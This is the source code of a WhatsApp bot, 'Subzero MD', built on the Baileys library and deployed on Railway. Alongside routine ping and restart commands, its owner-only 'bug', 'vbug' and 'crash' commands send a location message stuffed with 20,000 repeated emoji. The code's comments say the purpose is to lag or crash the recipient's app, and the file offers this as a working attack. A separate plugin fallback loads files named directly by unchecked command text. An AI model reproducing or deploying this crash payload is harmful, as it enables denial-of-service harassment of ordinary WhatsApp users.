/**
 * SUBZERO MD - FINAL RAILWAY EDITION (2026)
 * Author: Simon Salem (Project: MAPENZI NI SCUM)
 */

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    generateMessageID,
    downloadContentFromMessage,
    makeInMemoryStore,
    jidDecode,
    proto
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const express = require("express");
const path = require("path");

// --- RAILWAY PORT BINDING ---
const app = express();
const port = process.env.PORT || 8080;
app.get("/", (req, res) => res.send("Simon Salem's Subzero MD is Active ❄️"));
app.listen(port, () => console.log(`Server listening on port ${port}`));

// --- CONFIGURATION ---
const ownerNumber = ["2547XXXXXXXX"]; // REPLACE WITH YOUR NUMBER (No +)
const botName = "Subzero MD";
const prefix = ".";

async function startSalemSubzero() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const conn = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: true,
        logger: pino({ level: 'silent' }),
        browser: ["Subzero MD", "Chrome", "1.0.0"]
    });

    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                startSalemSubzero();
            }
        } else if (connection === 'open') {
            console.log(`✅ ${botName} by Simon Salem Connected!`);
        }
    });

    conn.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const type = Object.keys(mek.message)[0];
            const sender = mek.key.participant || mek.key.remoteJid;
            const isOwner = ownerNumber.includes(sender.split('@')[0]);

            const body = (type === 'conversation') ? mek.message.conversation : 
                         (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : '';
            
            const isCmd = body.startsWith(prefix);
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';

            if (isCmd) {
                console.log(`[EXEC] ${command} from ${sender}`);

                switch (command) {
                    case 'ping':
                        await conn.sendMessage(from, { text: "System Online ❄️\nProject: MAPENZI NI SCUM" }, { quoted: mek });
                        break;

                    // --- UPDATED BUG COMMANDS ---
                    case 'bug':
                    case 'vbug':
                    case 'crash':
                        if (!isOwner) return;
                        
                        // Creating a heavy Unicode/Location payload for 2026 UI lag
                        const bugPayload = "❄️".repeat(20000); 
                        
                        await conn.sendMessage(from, {
                            location: { degreesLatitude: -0.12, degreesLongitude: 34.75 },
                            name: `Subzero MD Bug\n${bugPayload}`,
                            address: bugPayload,
                            jpegThumbnail: null
                        }, { quoted: mek });

                        await conn.sendMessage(from, { text: "Bug Payload Deployed." });
                        break;

                    case 'restart':
                        if (!isOwner) return;
                        await conn.sendMessage(from, { text: "Restarting..." });
                        process.exit();
                        break;

                    default:
                        // Plugin fallback
                        const pluginFile = path.join(__dirname, 'plugins', `${command}.js`);
                        if (fs.existsSync(pluginFile)) {
                            require(pluginFile)(conn, mek, { isOwner, botName });
                        }
                        break;
                }
            }
        } catch (err) {
            console.log("Error logic: ", err);
        }
    });
}

startSalemSubzero();
